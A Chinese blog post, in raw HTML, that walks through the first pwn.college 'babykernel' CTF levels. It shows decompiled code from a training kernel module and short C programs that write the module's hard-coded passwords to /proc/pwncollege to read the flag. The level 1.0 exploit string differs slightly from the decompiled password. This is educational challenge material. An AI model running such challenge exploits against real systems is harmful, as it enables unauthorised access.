<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Pwncollege-Babykernel通关笔记 | aYoung's Blog</title><meta name="keywords" content="ctf,pwn,kernel"><meta name="author" content="aYoung"><meta name="copyright" content="aYoung"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="简介题目来源在pwn.college配套练习里的babykernel平台： The challenges created for pwn.college are educational material, and are used to grade CSE466 students at ASU………we would appreciate your help in keeping pwn.colle">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwncollege-Babykernel通关笔记">
<meta property="og:url" content="https://iamayoung.xyz/2022/02/04/pwncollege-babykernel%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="aYoung&#39;s Blog">
<meta property="og:description" content="简介题目来源在pwn.college配套练习里的babykernel平台： The challenges created for pwn.college are educational material, and are used to grade CSE466 students at ASU………we would appreciate your help in keeping pwn.colle">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s4.ax1x.com/2022/02/04/HeHoPf.png">
<meta property="article:published_time" content="2022-02-04T15:23:09.000Z">
<meta property="article:modified_time" content="2022-04-26T09:51:16.592Z">
<meta property="article:author" content="aYoung">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s4.ax1x.com/2022/02/04/HeHoPf.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://iamayoung.xyz/2022/02/04/pwncollege-babykernel%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-04-26 17:51:16'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://imgtu.com/i/731OZF" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s4.ax1x.com/2022/02/04/HeHoPf.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">aYoung's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Pwncollege-Babykernel通关笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-04T15:23:09.000Z" title="发表于 2022-02-04 23:23:09">2022-02-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-26T09:51:16.592Z" title="更新于 2022-04-26 17:51:16">2022-04-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>38分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>题目来源在<code>pwn.college</code>配套练习里的<code>babykernel</code><br>平台： The challenges created for pwn.college are educational material, and are used to grade CSE466 students at ASU………we would appreciate your help in keeping pwn.college a viable educational platform。</p>
<p>btw 这里的大部分内容在平台相应的课程都有提及，或者在youtube上有教师录制的视频提供了些assistance，又或者在discord的讨论区有些有用的信息</p>
<p>总之就是个人的总结和记录吧</p>
<h1 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h1><h2 id="init-module"><a href="#init-module" class="headerlink" title="init_module"></a>init_module</h2><p>初始化函数，打开根目录下的flag文件读到flag变量中<br><code>proc_create</code>会创建虚拟文件<code>/proc/pwncollege</code>，是题目提供的字符设备接口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  v0 = filp_open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">  kernel_read(v0, flag, <span class="number">128L</span>L, v0 + <span class="number">104</span>);</span><br><span class="line">  filp_close(v0, <span class="number">0L</span>L);</span><br><span class="line">  proc_entry = proc_create(<span class="string">&quot;pwncollege&quot;</span>, <span class="number">438L</span>L, <span class="number">0L</span>L, &amp;fops);</span><br><span class="line">  printk(&amp;unk_12D9, <span class="number">438L</span>L, v1);</span><br><span class="line">  printk(&amp;unk_10D8, <span class="number">438L</span>L, v2);</span><br><span class="line">  printk(&amp;unk_12D9, <span class="number">438L</span>L, v3);</span><br><span class="line">  printk(&amp;unk_1108, <span class="number">438L</span>L, v4);</span><br><span class="line">  printk(&amp;unk_1170, <span class="number">438L</span>L, v5);</span><br><span class="line">  printk(&amp;unk_11D0, <span class="number">438L</span>L, v6);</span><br><span class="line">  printk(&amp;unk_1220, <span class="number">438L</span>L, v7);</span><br><span class="line">  printk(&amp;unk_12E0, <span class="number">438L</span>L, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="device-open"><a href="#device-open" class="headerlink" title="device_open"></a>device_open</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">device_open</span><span class="params">(inode *inode, file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(&amp;byte_1030, inode, file);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="device-read"><a href="#device-read" class="headerlink" title="device_read"></a>device_read</h2><p>可以看到有判断，只有<code>device_state[0]==2</code>才会将内核态中的flag变量复制到用户态变量buffer中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">device_read</span><span class="params">(file *file, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">size_t</span> v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// kr08_8</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_1098, file, buffer);</span><br><span class="line">  v6 = flag;</span><br><span class="line">  <span class="keyword">if</span> ( device_state[<span class="number">0</span>] != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="string">&quot;device error: unknown state\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( device_state[<span class="number">0</span>] &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="string">&quot;password:\n&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( device_state[<span class="number">0</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="string">&quot;device error: unknown state\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( device_state[<span class="number">0</span>] == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          device_state[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          v6 = <span class="string">&quot;invalid password\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = length;</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(v6) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 - <span class="number">1</span> &lt;= length )</span><br><span class="line">    v7 = v8 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> v8 - <span class="number">1</span> - copy_to_user(buffer, v6, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="device-write"><a href="#device-write" class="headerlink" title="device_write"></a>device_write</h2><p>传进来用户态的buffer复制到内核的password里，，和字符串<code>teffctytaeippuch</code>比较，相同则<code>device_state[0]=2</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">device_write</span><span class="params">(file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_1058, file, buffer);</span><br><span class="line">  v5 = <span class="number">16L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0x10</span> )</span><br><span class="line">    v5 = length;</span><br><span class="line">  v6 = copy_from_user(password, buffer, v5);</span><br><span class="line">  v7 = <span class="number">17L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">0x11</span> )</span><br><span class="line">    v7 = v6;</span><br><span class="line">  device_state[<span class="number">0</span>] = (<span class="built_in">strncmp</span>(password, <span class="string">&quot;teffctytaeippuch&quot;</span>, v7) == <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先<code>open(&quot;/proc/pwncollege&quot;, O_RDWR)</code>以可读可写方式打开虚拟文件，向该文件执行读写操作便会进入内核态调用相应的api。通过调用<code>write</code>传入password，然后调用read把flag读到用户态的变量中，最后在用户态输出该变量即得到flag</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">char</span> key[] = <span class="string">&quot;teffctytaeippuc&quot;</span>;</span><br><span class="line">  write(fd, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line">  read(fd, buffer, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h1><p>和level1.0基本没差，只有<code>device_read</code>看起来有一些不同，password改一下就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">device_read</span><span class="params">(file *file, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( device_state[<span class="number">0</span>] == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    device_state[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">17L</span>L;</span><br><span class="line">    v6 = <span class="string">&quot;invalid password\n&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( device_state[<span class="number">0</span>] == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = flag;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = *v8;</span><br><span class="line">      v8 += <span class="number">4</span>;</span><br><span class="line">      v10 = ~v9 &amp; (v9 - <span class="number">16843009</span>) &amp; <span class="number">0x80808080</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v10 );</span><br><span class="line">    v6 = flag;</span><br><span class="line">    <span class="keyword">if</span> ( (~v9 &amp; (v9 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) == <span class="number">0</span> )</span><br><span class="line">      v10 &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (~v9 &amp; (v9 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) == <span class="number">0</span> )</span><br><span class="line">      v8 += <span class="number">2</span>;</span><br><span class="line">    offset = v10;</span><br><span class="line">    LOBYTE(offset) = <span class="number">2</span> * v10;</span><br><span class="line">    v5 = v8 - &amp;flag[__CFADD__(v10, v10) + <span class="number">3</span>];</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( device_state[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">28L</span>L;</span><br><span class="line">    v6 = <span class="string">&quot;device error: unknown state\n&quot;</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">    <span class="keyword">if</span> ( length &gt; v5 )</span><br><span class="line">      length = v5;</span><br><span class="line">    <span class="keyword">return</span> v5 - copy_to_user(buffer, v6, length, offset);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( length &gt; <span class="number">0xA</span> )</span><br><span class="line">    length = <span class="number">10L</span>L;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">10</span> - copy_to_user(buffer, <span class="string">&quot;password:\n&quot;</span>, length, offset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">char</span> key[] = <span class="string">&quot;vqhrnrwxusljyorq&quot;</span>;</span><br><span class="line">  write(fd, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line">  read(fd, buffer, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h1><p>很显然调用write传入password即可<br>需要注意的是这里<code>printk</code>不会把内容显示到终端上，但是会在内核缓冲区里，可以执行<code>dmesg</code>查看</p>
<h2 id="device-write-1"><a href="#device-write-1" class="headerlink" title="device_write"></a>device_write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">device_write</span><span class="params">(file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> len; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_D40, file, buffer);</span><br><span class="line">  len = <span class="number">16L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0x10</span> )</span><br><span class="line">    len = length;</span><br><span class="line">  v6 = copy_from_user(password, buffer, len);</span><br><span class="line">  v7 = <span class="number">17L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">17</span> )</span><br><span class="line">    v7 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password, <span class="string">&quot;qasdyasejvzixjid&quot;</span>, v7) )</span><br><span class="line">    printk(&amp;unk_F20, flag, v8);</span><br><span class="line">  <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

